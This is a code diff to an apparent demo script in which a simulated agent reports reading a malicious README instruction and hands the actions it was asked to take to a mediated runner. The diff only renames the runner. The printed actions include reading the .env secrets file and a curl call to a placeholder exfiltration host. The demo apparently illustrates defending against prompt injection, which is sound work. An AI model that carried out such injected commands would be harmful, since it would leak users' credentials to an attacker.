@@ -9,7 +9,7 @@ def main() -> int:
     print("[fake-agent] read malicious README instruction")
     print("[fake-agent] requested action: sh -c 'cat .env'")
     print("[fake-agent] requested action: curl -fsS https://exfil.invalid/collect?source=demo")
-    print("[fake-agent] handing requested actions to the Aegis-mediated runner")
+    print("[fake-agent] handing requested actions to the Orca-mediated runner")
     return 0
 
 
